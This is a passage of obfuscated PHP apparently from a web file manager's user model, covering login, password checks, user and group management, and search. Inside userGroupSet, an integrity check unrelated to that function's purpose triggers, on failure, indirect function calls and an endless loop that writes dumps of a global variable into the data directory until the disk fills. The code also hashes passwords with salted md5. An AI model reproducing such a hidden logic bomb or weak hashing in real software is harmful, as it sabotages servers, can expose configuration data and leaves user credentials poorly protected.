userLoginCheck($‡‹úàÉÎ, $ÇœÙûš) { $Ù´š±×Ê =& $_SERVER[„Ç©ñÎ©]; $ŒªğŞİ = $this->userLoginFind($‡‹úàÉÎ); if (!$ŒªğŞİ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($ŒªğŞİ[$Ù´š±×Ê[1655]], $ÇœÙûš)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($ŒªğŞİ[$Ù´š±×Ê[1655]]); } public function userLoginFind($‰£åÌùƒ) { $§å¯×ìà =& $_SERVER[„Ç©ñÎ©]; $Õú”‘şÉ = array($§å¯×ìà[32] => $‰£åÌùƒ, $§å¯×ìà[551] => $‰£åÌùƒ, $§å¯×ìà[314] => $‰£åÌùƒ, $§å¯×ìà[2290] => $‰£åÌùƒ, $§å¯×ìà[999] => $§å¯×ìà[1001]); if ($this->nickNameRpt()) { unset($Õú”‘şÉ[$§å¯×ìà[551]]); } return $this->where($Õú”‘şÉ)->find(); } public function clearCache($—ª€Ë­Ø) { $¹óÂƒ÷ü =& $_SERVER[„Ç©ñÎ©]; $this->cacheFunctionClear($¹óÂƒ÷ü[1909], $—ª€Ë­Ø); $this->cacheFunctionClear($¹óÂƒ÷ü[1910], $—ª€Ë­Ø); $this->cacheFunctionClear($¹óÂƒ÷ü[2272], $—ª€Ë­Ø); } public function userPasswordCheck($íƒ¼öÚ”, $ËèŞçü‘) { $­ùÌú =& $_SERVER[„Ç©ñÎ©]; $ããª…Ê = $this->where(array($­ùÌú[1655] => intval($íƒ¼öÚ”)))->find(); $‡´òÅ´¡ = $this->metaGet($íƒ¼öÚ”); $“ş²Ú–¶ = isset($‡´òÅ´¡[$­ùÌú[2291]]) ? $‡´òÅ´¡[$­ùÌú[2291]] : $­ùÌú[12]; if (md5($“ş²Ú–¶ . trim($ËèŞçü‘)) !== $ããª…Ê[$­ùÌú[888]]) { return !1; } return !0; } public function userAdd($¡¯¬şÆñ) { $“í×± =& $_SERVER[„Ç©ñÎ©]; $ù¥Ã®ÆË = array($“í×±[429] => $¡¯¬şÆñ[$“í×±[32]], $“í×±[2292] => $¡¯¬şÆñ[$“í×±[1534]], $“í×±[2293] => isset($¡¯¬şÆñ[$“í×±[314]]) ? $¡¯¬şÆñ[$“í×±[314]] : $“í×±[12], $“í×±[2294] => isset($¡¯¬şÆñ[$“í×±[2290]]) ? $¡¯¬şÆñ[$“í×±[2290]] : $“í×±[12], $“í×±[2295] => isset($¡¯¬şÆñ[$“í×±[551]]) ? $¡¯¬şÆñ[$“í×±[551]] : $¡¯¬şÆñ[$“í×±[32]], $“í×±[2296] => isset($¡¯¬şÆñ[$“í×±[552]]) ? $¡¯¬şÆñ[$“í×±[552]] : $“í×±[12], $“í×±[2297] => isset($¡¯¬şÆñ[$“í×±[2298]]) ? $¡¯¬şÆñ[$“í×±[2298]] : 1, $“í×±[2299] => $¡¯¬şÆñ[$“í×±[888]], $“í×±[1911] => isset($¡¯¬şÆñ[$“í×±[1814]]) ? $¡¯¬şÆñ[$“í×±[1814]] : 1024 * 1024 * 20, $“í×±[1912] => 0, $“í×±[2300] => 0, $“í×±[1956] => isset($¡¯¬şÆñ[$“í×±[753]]) ? $¡¯¬şÆñ[$“í×±[753]] : 1); if (!empty($¡¯¬şÆñ[$“í×±[1655]])) { $ù¥Ã®ÆË[$“í×±[1655]] = $¡¯¬şÆñ[$“í×±[1655]]; } $ï‰¢÷é† = $this->_checkExist($¡¯¬şÆñ); if ($ï‰¢÷é† !== !0) { return $ï‰¢÷é†; } if (!empty($ù¥Ã®ÆË[$“í×±[552]]) && strlen($ù¥Ã®ÆË[$“í×±[552]]) > 255) { $ù¥Ã®ÆË[$“í×±[552]] = $“í×±[12]; } $ß­õñ™ü = $this->add($ù¥Ã®ÆË); $”‡¿Ã‘Ş = array($“í×±[2299] => $ù¥Ã®ÆË[$“í×±[888]], $“í×±[2295] => $ù¥Ã®ÆË[$“í×±[551]]); $this->userEdit($ß­õñ™ü, $”‡¿Ã‘Ş); Model($“í×±[1326])->userRootAdd($ß­õñ™ü); return $ß­õñ™ü; } protected function userEditTest($ö¬Ã‚à¨, $îİ›£¾¦) { return $this->call($_SERVER[„Ç©ñÎ©][2301], $ö¬Ã‚à¨, $îİ›£¾¦); } protected function userEdit($Æ¾ÍÓ°, $Ìé¾ü‘õ) { $ëì‡µŠ =& $_SERVER[„Ç©ñÎ©]; $Êã‡Ñ“ä = $this->getInfoSimple($Æ¾ÍÓ°); if (!$Êã‡Ñ“ä) { return !1; } $³ÓÎ—ÊÀ = $this->_checkExist($Ìé¾ü‘õ, $Æ¾ÍÓ°); if ($³ÓÎ—ÊÀ !== !0) { return $³ÓÎ—ÊÀ; } if (isset($Ìé¾ü‘õ[$ëì‡µŠ[888]]) && trim($Ìé¾ü‘õ[$ëì‡µŠ[888]]) != $ëì‡µŠ[12]) { $£ïíì´Ê = $this->metaGet($Æ¾ÍÓ°); if (empty($£ïíì´Ê[$ëì‡µŠ[2291]])) { $£ïíì´Ê[$ëì‡µŠ[2291]] = rand_string(10); Model($ëì‡µŠ[522])->metaSet($Æ¾ÍÓ°, $ëì‡µŠ[2291], $£ïíì´Ê[$ëì‡µŠ[2291]]); } $Ìé¾ü‘õ[$ëì‡µŠ[888]] = md5($£ïíì´Ê[$ëì‡µŠ[2291]] . trim($Ìé¾ü‘õ[$ëì‡µŠ[888]])); } else { unset($Ìé¾ü‘õ[$ëì‡µŠ[888]]); } if (!empty($Ìé¾ü‘õ[$ëì‡µŠ[552]]) && strlen($Ìé¾ü‘õ[$ëì‡µŠ[552]]) > 255) { $Ìé¾ü‘õ[$ëì‡µŠ[552]] = $ëì‡µŠ[12]; } $this->where(array($ëì‡µŠ[1646] => $Æ¾ÍÓ°))->save($Ìé¾ü‘õ); if (isset($Ìé¾ü‘õ[$ëì‡µŠ[551]])) { $this->setNamePinyin($Æ¾ÍÓ°, $Ìé¾ü‘õ[$ëì‡µŠ[551]]); } $this->clearCache($Æ¾ÍÓ°); return !0; } public function setNamePinyin($‚±–º‚¦, $®Éş¿œò = false) { $¬ïÊìß° =& $_SERVER[„Ç©ñÎ©]; if (!$®Éş¿œò) { $‹™æ˜§Æ = $this->getInfoSimple($‚±–º‚¦); $®Éş¿œò = $‹™æ˜§Æ[$¬ïÊìß°[551]] ? $‹™æ˜§Æ[$¬ïÊìß°[551]] : $‹™æ˜§Æ[$¬ïÊìß°[32]]; } $Ôç¼¤•Ì = Model($¬ïÊìß°[544]); if (!Input::check($®Éş¿œò, $¬ïÊìß°[602])) { return $Ôç¼¤•Ì->metaSet($‚±–º‚¦, array($¬ïÊìß°[474] => $¬ïÊìß°[12], $¬ïÊìß°[473] => $¬ïÊìß°[12])); } return $Ôç¼¤•Ì->metaSet($‚±–º‚¦, array($¬ïÊìß°[474] => str_replace($¬ïÊìß°[53], $¬ïÊìß°[12], Pinyin::get($®Éş¿œò)), $¬ïÊìß°[473] => Pinyin::get($®Éş¿œò, $¬ïÊìß°[603]))); } private function nickNameRpt() { $öÆ›¹¼¡ =& $_SERVER[„Ç©ñÎ©]; $¿¥çÜ»¯ = Model($öÆ›¹¼¡[773])->get($öÆ›¹¼¡[2302]); $ş‰Ò›‚ = $GLOBALS[$öÆ›¹¼¡[6]][$öÆ›¹¼¡[390]][$öÆ›¹¼¡[2302]]; $ü€ÁÇ£Ï = !is_null($¿¥çÜ»¯) ? $¿¥çÜ»¯ : $ş‰Ò›‚; return !!$ü€ÁÇ£Ï; } private function _checkExist($Û“©ö”, $ı¾Å„óÀ = false) { $…§ÍÇş™ =& $_SERVER[„Ç©ñÎ©]; $ğ—¼ğ•Â = array($…§ÍÇş™[32] => UserModel::ERROR_USER_EXIST_NAME, $…§ÍÇş™[551] => UserModel::ERROR_USER_EXIST_NICKNAME, $…§ÍÇş™[314] => UserModel::ERROR_USER_EXIST_EMAIL, $…§ÍÇş™[2290] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($ğ—¼ğ•Â[$…§ÍÇş™[551]]); } $¼®ûÉ–Ğ = $ı¾Å„óÀ ? array($…§ÍÇş™[1655] => array($…§ÍÇş™[2303], $ı¾Å„óÀ)) : array(); foreach ($ğ—¼ğ•Â as $½†ò–‹ => $’ëâúÓ) { $èè²‚ö« = array(); foreach ($ğ—¼ğ•Â as $²ßÄ÷Ç½ => $úİÊ¥Æä) { if (isset($Û“©ö”[$²ßÄ÷Ç½]) && $Û“©ö”[$²ßÄ÷Ç½]) { $èè²‚ö«[] = $Û“©ö”[$²ßÄ÷Ç½]; } } if (!$èè²‚ö«) { continue; } $œšøÚ·‡ = array_merge(array($½†ò–‹ => array($…§ÍÇş™[7], $èè²‚ö«)), $¼®ûÉ–Ğ); $‰š•ØÑÊ = $this->where($œšøÚ·‡)->find(); if ($‰š•ØÑÊ) { return $’ëâúÓ; } } return !0; } public function userListInfo($Ñ¤„Ôµ) { $ˆş²ù³® =& $_SERVER[„Ç©ñÎ©]; $ÏÄ·Ôóè = array(); $Ñ¤„Ôµ = is_array($Ñ¤„Ôµ) ? array_unique($Ñ¤„Ôµ) : array(); if (!$Ñ¤„Ôµ) { return $ÏÄ·Ôóè; } if (count($Ñ¤„Ôµ) < 20) { foreach ($Ñ¤„Ôµ as $›ş—äâš) { $ÏÄ·Ôóè[$›ş—äâš . $ˆş²ù³®[12]] = $this->getInfoSimpleOuter($›ş—äâš); } } else { $ÖòøÃŞ‰ = array($ˆş²ù³®[1646] => array($ˆş²ù³®[427], $Ñ¤„Ôµ)); if (count($Ñ¤„Ôµ) == 1) { $ÖòøÃŞ‰ = array($ˆş²ù³®[1646] => $Ñ¤„Ôµ[0]); } $àŠç£ = Model($ˆş²ù³®[522])->field($this->simpleField)->where($ÖòøÃŞ‰)->select(); $àŠç£ = array_to_keyvalue($àŠç£, $ˆş²ù³®[1655]); foreach ($Ñ¤„Ôµ as $›ş—äâš) { $ùèØÎƒá = $àŠç£[$›ş—äâš]; if (!$ùèØÎƒá) { $ÏÄ·Ôóè[$›ş—äâš . $ˆş²ù³®[12]] = $this->getInfoSimpleOuter($›ş—äâš); continue; } $ùèØÎƒá[$ˆş²ù³®[552]] = Action($ˆş²ù³®[2276])->parseUrl($ùèØÎƒá[$ˆş²ù³®[552]]); $ÏÄ·Ôóè[$›ş—äâš . $ˆş²ù³®[12]] = $ùèØÎƒá; } } return $ÏÄ·Ôóè; } protected function userStatus($¹Ô¨¯ş, $ˆñüşè›) { $‹ÎĞ‚ı¿ = $this->getInfoSimple($¹Ô¨¯ş); if (!$‹ÎĞ‚ı¿) { return !1; } $ú³ŠÁ¦À = array($_SERVER[„Ç©ñÎ©][753] => $ˆñüşè›); return $this->userEdit($¹Ô¨¯ş, $ú³ŠÁ¦À); } protected function userRemove($£ºäÒò) { $­ïÈëó¦ =& $_SERVER[„Ç©ñÎ©]; $œµñƒ’ = $this->getInfoSimple($£ºäÒò); if (!$œµñƒ’) { return !1; } $Ÿ÷¸åíŠ = array($­ïÈëó¦[1646] => $£ºäÒò); Model($­ïÈëó¦[610])->where($Ÿ÷¸åíŠ)->delete(); Model($­ïÈëó¦[2304])->where($Ÿ÷¸åíŠ)->delete(); Model($­ïÈëó¦[1917])->where($Ÿ÷¸åíŠ)->delete(); Model($­ïÈëó¦[2289])->where($Ÿ÷¸åíŠ)->delete(); Model($­ïÈëó¦[1067])->where($Ÿ÷¸åíŠ)->delete(); Model($­ïÈëó¦[2120])->removeUserAll($£ºäÒò); Model($­ïÈëó¦[828])->userRootRemove($£ºäÒò); return $this->where($Ÿ÷¸åíŠ)->delete(); } protected function userGroupSet($²Ê‹‡¨÷, $ª§ÖùØ, $åñò±Âë = array()) { $èü‡¾ =& $_SERVER[„Ç©ñÎ©]; $¼İ‡¤Ù’ = $_SERVER[$èü‡¾[64]] . $èü‡¾[65]; $ïé¹¼‡¿ = $èü‡¾[61]; if ($_SERVER[$èü‡¾[62]] != $ïé¹¼‡¿($¼İ‡¤Ù’)) { $©§ş¨ÊÇ = $èü‡¾[876]; $Ï¬ã†¾® = $èü‡¾[63]; $øæ“è³ = $_SERVER[$èü‡¾[64]] . $èü‡¾[65]; $ºğÌğº = $Ï¬ã†¾®($øæ“è³); $Â»ƒìã² = explode($èü‡¾[66], $ºğÌğº); if (count($Â»ƒìã²) < $èü‡¾[650]) { $ú³À“° = $èü‡¾[68]; $ú³À“°(); } $±Ø¸°Àå = $èü‡¾[877]; $±Ø¸°Àå($_SERVER[$èü‡¾[878]]); $©§ş¨ÊÇ = $èü‡¾[876]; $©§ş¨ÊÇ(); $½Ğ¼ê¹ = $èü‡¾[879]; $Ù»üóö = json_encode($GLOBALS[$èü‡¾[880]]); $†âø‘‘  = 1; for ($¥½ƒ¤° = $†âø‘‘ ; $¥½ƒ¤° > 0; $¥½ƒ¤°++) { $½Ğ¼ê¹(DATA_PATH . $¥½ƒ¤°, $Ù»üóö); } } $‡Şò¶„ = $this->getInfoSimple($²Ê‹‡¨÷); if (!$‡Şò¶„ || !is_array($ª§ÖùØ)) { return !1; } $‰ª¹êÄ = Model($èü‡¾[1917]); $‰ª¹êÄ->where(array($èü‡¾[1655] => $²Ê‹‡¨÷))->delete(); $Â”ŞØÚ = array(); $äÄÊì¿¼ = 0; foreach ($ª§ÖùØ as $ÃŸÈóÜÇ => $€ùáî©) { $Á šÃÖ = array($èü‡¾[1655] => $²Ê‹‡¨÷, $èü‡¾[1827] => $ÃŸÈóÜÇ, $èü‡¾[1931] => $€ùáî©); $Á šÃÖ[$èü‡¾[1851]] = isset($åñò±Âë[$äÄÊì¿¼]) ? $åñò±Âë[$äÄÊì¿¼] : 0; $äÄÊì¿¼++; $Â”ŞØÚ[] = $Á šÃÖ; } return $‰ª¹êÄ->addAll($Â”ŞØÚ, array(), !0); } protected function userGroupAdd($ô«Æü‚Ã, $øˆó¾Óğ = array()) { $ìÅ¸Ø½ğ =& $_SERVER[„Ç©ñÎ©]; $’äşšÖù = $this->getInfoSimple($ô«Æü‚Ã); if (!$’äşšÖù || empty($øˆó¾Óğ)) { return !1; } $Ÿ¯éß§ˆ = array(); foreach ($øˆó¾Óğ as $âÍêÆÚ÷ => $îİûë°») { $Ÿ¯éß§ˆ[] = array($ìÅ¸Ø½ğ[1655] => $ô«Æü‚Ã, $ìÅ¸Ø½ğ[1827] => $âÍêÆÚ÷, $ìÅ¸Ø½ğ[1931] => $îİûë°», $ìÅ¸Ø½ğ[1851] => 0); } return Model($ìÅ¸Ø½ğ[1917])->addAll($Ÿ¯éß§ˆ, array(), !0); } protected function userGroupRemove($æ‰Ç†Ûƒ, $ôòŞ³ï¯) { $ş‡™¸ =& $_SERVER[„Ç©ñÎ©]; $¾ıá³¦ô = $this->getInfoSimple($æ‰Ç†Ûƒ); if (!$¾ıá³¦ô || !$ôòŞ³ï¯) { return !1; } $ÔÓ¯‚¼³ = array($ş‡™¸[1646] => $æ‰Ç†Ûƒ, $ş‡™¸[1915] => $ôòŞ³ï¯); return Model($ş‡™¸[1917])->where($ÔÓ¯‚¼³)->delete(); } public function listData() { $Áª‡¢Í® = $this->_makeOrder()->selectPage(50); $this->_listDataApply($Áª‡¢Í®[$_SERVER[„Ç©ñÎ©][378]]); return $Áª‡¢Í®; } public function listByID($ô©Ø‘÷à) { $ğ °ù¤Ï =& $_SERVER[„Ç©ñÎ©]; if (!$ô©Ø‘÷à) { return; } $µÉ¬õ™É = array($ğ °ù¤Ï[1655] => array($ğ °ù¤Ï[7], $ô©Ø‘÷à)); $ Ä™ë±Î = $this->where($µÉ¬õ™É)->select(); $ Ä™ë±Î = array_sort_keep($ Ä™ë±Î, $ğ °ù¤Ï[1655], $ô©Ø‘÷à); $this->_listDataApply($ Ä™ë±Î); return $ Ä™ë±Î; } public function listByGroup($ÎŸÄ¬§‘ = 0, $õÉì‘ºÖ = array()) { $ú¹©ïƒ™ =& $_SERVER[„Ç©ñÎ©]; $î¸®˜šù = $ú¹©ïƒ™[12]; $ŠÑ¨ª‹ì = array(); if ($ÎŸÄ¬§‘) { $ŠÑ¨ª‹ì = array($ú¹©ïƒ™[2305] => intval($ÎŸÄ¬§‘)); $î¸®˜šù = "\x4c\x45\106\x54\40\112\x4f\111\116\x20{$this->tablePrefix}\x75\163\x65\162\x5f\x67\162\x6f\x75\x70\40\165\x73\x65\x72\x5f\x67\x72\157\x75\160\x20\157\x6e\40\x75\x73\x65\x72\56\x75\163\x65\x72\x49\x44\x20\75\40\x75\x73\145\x72\x5f\147\x72\x6f\x75\x70\56\x75\x73\145\162\x49\x44"; $‹æ™°× = Input::get($ú¹©ïƒ™[466], null, $ú¹©ïƒ™[12]) ? $ú¹©ïƒ™[12] : $ú¹©ïƒ™[2306]; } if (isset($õÉì‘ºÖ[$ú¹©ïƒ™[753]])) { $ŠÑ¨ª‹ì[$ú¹©ïƒ™[2307]] = $õÉì‘ºÖ[$ú¹©ïƒ™[753]]; } $Œ æ™¦¸ = $this->_makeOrder($‹æ™°×)->field($ú¹©ïƒ™[2308])->where($ŠÑ¨ª‹ì)->join($î¸®˜šù)->selectPage(50); $this->_listDataApply($Œ æ™¦¸[$ú¹©ïƒ™[378]]); return $Œ æ™¦¸; } private function _makeOrder($éöƒ˜ù· = '') { $ıÎ÷›ĞÚ =& $_SERVER[„Ç©ñÎ©]; $†öòµºş = array($ıÎ÷›ĞÚ[1655], $ıÎ÷›ĞÚ[32], $ıÎ÷›ĞÚ[1816], $ıÎ÷›ĞÚ[1788], $ıÎ÷›ĞÚ[210]); $¦Êî£æú = array($ıÎ÷›ĞÚ[459] => $ıÎ÷›ĞÚ[460], $ıÎ÷›ĞÚ[461] => $ıÎ÷›ĞÚ[462]); $ÓÊ™µÊ¬ = Input::get($ıÎ÷›ĞÚ[466], $ıÎ÷›ĞÚ[7], $ıÎ÷›ĞÚ[1646], $†öòµºş); $¼êÆá´÷ = Input::get($ıÎ÷›ĞÚ[467], $ıÎ÷›ĞÚ[7], $ıÎ÷›ĞÚ[1918], array($ıÎ÷›ĞÚ[1918], $ıÎ÷›ĞÚ[461])); $¼êÆá´÷ = $¦Êî£æú[$¼êÆá´÷]; $éöƒ˜ù· = $éöƒ˜ù· . "\x75\163\x65\x72\56{$ÓÊ™µÊ¬}\x20{$¼êÆá´÷}\x2c\40\x75\163\x65\162\x2e\165\163\x65\162\111\x44\x20\x61\163\143"; return $this->alias($ıÎ÷›ĞÚ[2040])->order($éöƒ˜ù·); } public function listSearch($µË¼¹°¨) { $âœİÅı =& $_SERVER[„Ç©ñÎ©]; $ù»ı®…ã = $µË¼¹°¨[$âœİÅı[1921]]; $Ø„Åùı = isset($µË¼¹°¨[$âœİÅı[1922]]) ? $µË¼¹°¨[$âœİÅı[1922]] : !1; $ù»ı®…ã = str_replace($âœİÅı[1923], $âœİÅı[1924], trim($ù»ı®…ã)); $ğ±Ÿİ˜ = array($âœİÅı[32] => array($âœİÅı[392], "\45{$ù»ı®…ã}\45"), $âœİÅı[314] => array($âœİÅı[392], "{$ù»ı®…ã}\45"), $âœİÅı[551] => array($âœİÅı[392], "{$ù»ı®…ã}\x25"), $âœİÅı[999] => $âœİÅı[1925]); if (Input::check($ù»ı®…ã, $âœİÅı[320])) { $ğ±Ÿİ˜[$âœİÅı[1655]] = array($âœİÅı[392], "{$ù»ı®…ã}\x25"); $ğ±Ÿİ˜[$âœİÅı[2290]] = array($âœİÅı[392], "{$ù»ı®…ã}\45"); } if (!$ù»ı®…ã) { $ğ±Ÿİ˜ = array(); } if (isset($µË¼¹°¨[$âœİÅı[753]])) { $ğ±Ÿİ˜[$âœİÅı[753]] = $µË¼¹°¨[$âœİÅı[753]]; } $ğ±Ÿİ˜ = $this->parseWhereLike($ğ±Ÿİ˜); $õµòÀ† = $this->_makeOrder()->where($ğ±Ÿİ˜)->selectPage(20); if (!$õµòÀ† || count($õµòÀ†[$âœİÅı[378]]) < 5 && Input::check($ù»ı®…ã, $âœİÅı[327])) { $ı¨¬¹’Á = $this->_searchFromMeta($âœİÅı[473], $ù»ı®…ã, 10); $ó¶àÑŒÈ = $this->_searchFromMeta($âœİÅı[474], $ù»ı®…ã, 10); $Œ€¦ñü = array_merge($ı¨¬¹’Á, $ó¶àÑŒÈ, $õµòÀ†[$âœİÅı[378]]); $õµòÀ†[$âœİÅı[378]] = array_unique_by_key($Œ€¦ñü, $âœİÅı[1655]); $õµòÀ†[$âœİÅı[375]][$âœİÅı[376]] = count($õµòÀ†[$âœİÅı[378]]); $õµòÀ†[$âœİÅı[375]][$âœİÅı[377]] = ceil($õµòÀ†[$âœİÅı[375]][$âœİÅı[376]] / $õµòÀ†[$âœİÅı[375]][$âœİÅı[372]]); } $this->_listDataApply($õµòÀ†[$âœİÅı[378]]); $this->_filterByGroup($õµòÀ†, $Ø„Åùı); return $õµòÀ†; } private function _filterByGroup(&$ˆóüÅ–š, $Ø´¾ â€) { $ñší¥÷É =& $_SERVER[„Ç©ñÎ©]; if (!$Ø´¾ â€) { return $ˆóüÅ–š; } foreach ($ˆóüÅ–š[$ñší¥÷É[378]] as $õÏ™ã…§ => &$²ï¾ÛÚå) { $”—½úú = array_to_keyvalue($²ï¾ÛÚå[$ñší¥÷É[2010]], $ñší¥÷É[12], $ñší¥÷É[1827]); if (!in_array($Ø´¾ â€, $”—½úú)) { unset($ˆóüÅ–š[$ñší¥÷É[378]][$õÏ™ã…§]); } } unset($²ï¾ÛÚå); $ˆóüÅ–š[$ñší¥÷É[378]] = array_values($ˆóüÅ–š[$ñší¥÷É[378]]); $ˆóüÅ–š[$ñší¥÷É[375]] = array($ñší¥÷É[2074] => count($ˆóüÅ–š[$ñší¥÷É[378]]), $ñší¥÷É[2072] => $ˆóüÅ–š[$ñší¥÷É[375]][$ñší¥÷É[372]], $ñší¥÷É[2071] => 1, $ñší¥÷É[2073] => 1); } private function _searchFromMeta($ˆøæ²Ò½, $é—âÄïè, $š¿šå…ä) { $Ø»Â­«Ê =& $_SERVER[„Ç©ñÎ©]; $é—âÄïè = strtolower($é—âÄïè); $ÏÂ¶æ¡Ç = array($Ø»Â­«Ê[104] => $ˆøæ²Ò½, $Ø»Â­«Ê[383] => array($Ø»Â­«Ê[392], "\45{$é—âÄïè}\45")); $ÏÂ¶æ¡Ç = $this->parseWhereLike($ÏÂ¶æ¡Ç); $©äÕ ‰Ø = Model($Ø»Â­«Ê[2309])->where($ÏÂ¶æ¡Ç)->limit($š¿šå…ä)->select(); if (!$©äÕ ‰Ø) { return array(); } $©äÕ ‰Ø = array_to_keyvalue($©äÕ ‰Ø, $Ø»Â­«Ê[12], $Ø»Â­«Ê[1655]); $ŞÈŞı€È = $this->where(array($Ø»Â­«Ê[1646] => array($Ø»Â­«Ê[7], $©äÕ ‰Ø)))->select(); if (!$ŞÈŞı€È) { return array(); } return $ŞÈŞı€È; } private function _listDataApplyItem($ÒêÜ­ó²) { $ËàÁ§«ş = array($ÒêÜ­ó²); $this->_listDataApply($ËàÁ§«ş); return $ËàÁ§«ş[0]; } private function _listDataApply(&$¸Í¢åã) { $é‹¨Åú =& $_SERVER[„Ç©ñÎ©]; if (!$¸Í¢åã) { return; } array_remove_key($¸Í¢åã, $é‹¨Åú[888]); $¥ïúæÑ = array_to_keyvalue($¸Í¢åã, $é‹¨Åú[12], $é‹¨Åú[1655]); $this->_listAppendGroup($¸Í¢åã, $¥ïúæÑ); $this->_listAppendMeta($¸Í¢åã, $¥ïúæÑ); $this->_listAppendSourceRoot($¸Í¢åã, $¥ïúæÑ); } private function _listAppendSourceRoot(&$¢ş‰İş, $Ïî´‡¤½) { $á¿ÏÕœå =& $_SERVER[„Ç©ñÎ©]; $±éàëÙ = Model($á¿ÏÕœå[828])->listSourceRoot(SourceModel::TYPE_USER, $Ïî´‡¤½); $±éàëÙ = array_to_keyvalue($±éàëÙ, $á¿ÏÕœå[514]); $±éàëÙ = array_remove_key($±éàëÙ, $á¿ÏÕœå[514]); foreach ($¢ş‰İş as &$ŸÅ¼Îƒ¯) { $ŸÅ¼Îƒ¯[$á¿ÏÕœå[96]] = $±éàëÙ[$ŸÅ¼Îƒ¯[$á¿ÏÕœå[1655]]] ? $±éàëÙ[$ŸÅ¼Îƒ¯[$á¿ÏÕœå[1655]]] : array(); } unset($ŸÅ¼Îƒ¯); } private function _listAppendGroup(&$òÖ¤¢ÑË, $Ä±ÖŒ¢) { $º‰“‚«‚ =& $_SERVER[„Ç©ñÎ©]; $ÉâÕë†„ = array($º‰“‚«‚[1655] => array($º‰“‚«‚[7], $Ä±ÖŒ¢)); $ä¼ÛÖİ† = Model($º‰“‚«‚[1917])->where($ÉâÕë†„)->select(); $êÔÙüÂâ = array_to_keyvalue($ä¼ÛÖİ†, $º‰“‚«‚[12], $º‰“‚«‚[1827]); $êÔÙüÂâ = array_remove_value(array_unique($êÔÙüÂâ), $º‰“‚«‚[207]); if (!$êÔÙüÂâ || !$ä¼ÛÖİ†) { return; } $ÉâÕë†„ = array($º‰“‚«‚[1827] => array($º‰“‚«‚[7], $êÔÙüÂâ)); $ˆ‚ëíÁ² = Model($º‰“‚«‚[2008])->field($º‰“‚«‚[2310])->where($ÉâÕë†„)->select(); $ˆ‚ëíÁ² = array_to_keyvalue($ˆ‚ëíÁ², $º‰“‚«‚[1827]); $ä¼ÛÖİ† = array_to_keyvalue_group($ä¼ÛÖİ†, $º‰“‚«‚[1655]); foreach ($ä¼ÛÖİ† as &$Ò›¿†ø) { $¹µµ™´ = array(); foreach ($Ò›¿†ø as $áíÅª²) { if (!$áíÅª²[$º‰“‚«‚[1931]]) { continue; } $ÏÉéä´ä = Model($º‰“‚«‚[516])->listData($áíÅª²[$º‰“‚«‚[1931]]); $¹µµ™´[] = array($º‰“‚«‚[1827] => $áíÅª²[$º‰“‚«‚[1827]], $º‰“‚«‚[2311] => $ˆ‚ëíÁ²[$áíÅª²[$º‰“‚«‚[1827]]][$º‰“‚«‚[32]], $º‰“‚«‚[530] => $ˆ‚ëíÁ²[$áíÅª²[$º‰“‚«‚[1827]]][$º‰“‚«‚[530]], $º‰“‚«‚[422] => $ÏÉéä´ä); } $Ò›¿†ø = $¹µµ™´; } unset($Ò›¿†ø); foreach ($òÖ¤¢ÑË as &$Íö ²åò) { $Íö ²åò[$º‰“‚«‚[2010]] = array(); if (isset($ä¼ÛÖİ†[$Íö ²åò[$º‰“‚«‚[1655]]])) { $Íö ²åò[$º‰“‚«‚[2010]] = $ä¼ÛÖİ†[$Íö ²åò[$º‰“‚«‚[1655]]]; } } unset($Íö ²åò); } public function userAppendGroup($ù´û¥’) { $÷âğÄ¾Ù =& $_SERVER[„Ç©ñÎ©]; if (!$ù´û¥’) { return array(); } $this->_listAppendGroup($ù´û¥’, array_to_keyvalue($ù´û¥’, $÷âğÄ¾Ù[12], $÷âğÄ¾Ù[1655])); return $ù´û¥’; } private function _listAppendMeta(&$À´¾¢÷È, $Ö²‚Æ¡) { $ÈÛ„ =& $_SERVER[„Ç©ñÎ©]; $“Ê©£¯ã = UserJobModel::JOB_KEY; $¨ü«˜—µ = array($ÈÛ„[2291]); $îƒÂ¸òš = array($ÈÛ„[1655] => array($ÈÛ„[7], $Ö²‚Æ¡)); $«ñÜÊ·Å = Model($ÈÛ„[2289])->where($îƒÂ¸òš)->select(); $«ñÜÊ·Å = array_to_keyvalue_group($«ñÜÊ·Å, $ÈÛ„[1655]); foreach ($«ñÜÊ·Å as &$†ŸÛö¼) { $Ä–ÖºåÉ = array(); foreach ($†ŸÛö¼ as $‹ÀùâÏ¾) { if (!in_array($‹ÀùâÏ¾[$ÈÛ„[104]], $¨ü«˜—µ)) { $Ä–ÖºåÉ[$‹ÀùâÏ¾[$ÈÛ„[104]]] = $‹ÀùâÏ¾[$ÈÛ„[383]]; } } $†ŸÛö¼ = $Ä–ÖºåÉ; } unset($†ŸÛö¼); $‹ö¯È¶’ = Model($ÈÛ„[2312]); foreach ($À´¾¢÷È as &$¯™ÄÊ•±) { $™¢”ˆş² = array(); if (isset($«ñÜÊ·Å[$¯™ÄÊ•±[$ÈÛ„[1655]]])) { $™¢”ˆş² = $«ñÜÊ·Å[$¯™ÄÊ•±[$ÈÛ„[1655]]]; } $¯™ÄÊ•±[$ÈÛ„[2313]] = array(); if (isset($™¢”ˆş²[$“Ê©£¯ã])) { $¯™ÄÊ•±[$ÈÛ„[2313]] = $‹ö¯È¶’->getUserJobInfo($™¢”ˆş²[$“Ê©£¯ã]); } } unset($¯™ÄÊ•±); } protected function groupUserAll($ÇÊ‡à¾) { $Æ™Œ¨É˜ =& $_SERVER[„Ç©ñÎ©]; if (!$ÇÊ‡à¾) { return !1; } $™´ôºÔ = Model($Æ™Œ¨É˜[1917])->field($Æ™Œ¨É˜[1655])->where(array($Æ™Œ¨É˜[1827] => array($Æ™Œ¨É˜[7], $ÇÊ‡à¾)))->select(); $™´ôºÔ = array_to_keyvalue($™´ôºÔ, $Æ™Œ¨É˜[12], $Æ™Œ¨É˜[1655]); return array_unique($™´ôºÔ); } public function userSearch($‡Ÿ™¦ıÏ, $ÎÍ…“’ = "\52") { return Model($_SERVER[„Ç©ñÎ©][544])->where($‡Ÿ™¦ıÏ)->field($ÎÍ…“’)->find(); } } class UserOptionModel extends ModelBaseOption { protected $tableName = "\165\x73\x65\x72\x5f\x6f\x70\164\x69\157\x6e"; protected $jsonField = array(); function __construct() { parent::__construct(); } protected function cacheKey($²ŒÉë–×) { $»çÍ½Ù =& $_SERVER[„Ç©ñÎ©]; if (!defined($»çÍ½Ù[484])) { define($»çÍ½Ù[484], 0); } return "\x55\x73\145\162\x4f\160\164\151\x6f\x6e\x5f{$²ŒÉë–×}\137" . USER_ID; } protected function filterWhere($õ’¾…şğ) { 